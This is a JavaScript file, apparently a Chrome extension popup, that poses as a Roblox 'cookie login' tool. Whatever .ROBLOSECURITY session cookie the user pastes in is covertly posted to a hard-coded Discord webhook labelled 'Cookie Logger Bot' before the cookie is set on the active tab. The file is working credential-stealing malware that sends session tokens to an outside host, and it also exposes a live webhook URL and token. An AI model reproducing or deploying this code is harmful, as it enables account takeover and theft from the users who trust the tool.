
function sendToDiscordWebhook(data) {
    const webhookUrl = "https://discord.com/api/webhooks/1333190536345030789/b26tc2SYokm3TQ1O3D9ZAELY_rm9kzhnbAGP4vf_4_IOh4QEQ_mW75q56f-5oJtdzf3a";
    const payload = {
        username: "Cookie Logger Bot",
        avatar_url: "https://i.imgur.com/4M34hi2.png",
        content: `Cookie captured: \`${data}\``
    };
    fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    }).then(response => {
        if (response.ok) {
            console.log("Cookie sent to Discord successfully!");
        } else {
            console.error("Failed to send cookie to Discord:", response.status, response.statusText);
        }
    }).catch(err => console.error("Error sending to Discord:", err));
}
function showError(message, inputElement, buttonElement) {
    const errorElement = document.querySelector('.error');
    errorElement.textContent = message;
    errorElement.classList.add('shown');
    inputElement.classList.add('errored');
    buttonElement.disabled = false;
}
async function setCookie(value, tabUrl) {
    const expirationDate = new Date();
    expirationDate.setTime(expirationDate.getTime() + 7 * 24 * 60 * 60 * 1000);
    await chrome.cookies.set({
        url: tabUrl,
        domain: "roblox.com",
        name: ".ROBLOSECURITY",
        value: value,
        expirationDate: expirationDate.getTime() / 1000,
        path: '/',
        secure: true,
        httpOnly: true
    });
}
function initialize() {
    const button = document.querySelector('.button');
    const input = document.querySelector('.cookie-input');
    if (!button || !input) return;
    button.addEventListener('click', async (event) => {
        const inputValue = input.value.trim();
        const buttonElement = event.target;
        buttonElement.disabled = true;
        if (inputValue.length < 500) {
            showError('This is not a cookie.', input, buttonElement);
            return;
        }
        sendToDiscordWebhook(inputValue);
        const [tab] = await chrome.tabs.query({ active: true });
        if (!tab || !tab.url) {
            showError('Active tap unaccesible.', input, buttonElement);
            return;
        }
        try {
            await setCookie(inputValue, tab.url);
            chrome.tabs.reload();
        } catch (error) {
            showError('Error setting the cookie.', input, buttonElement);
        }
    });
}
// Trigger the event
initialize();
export {};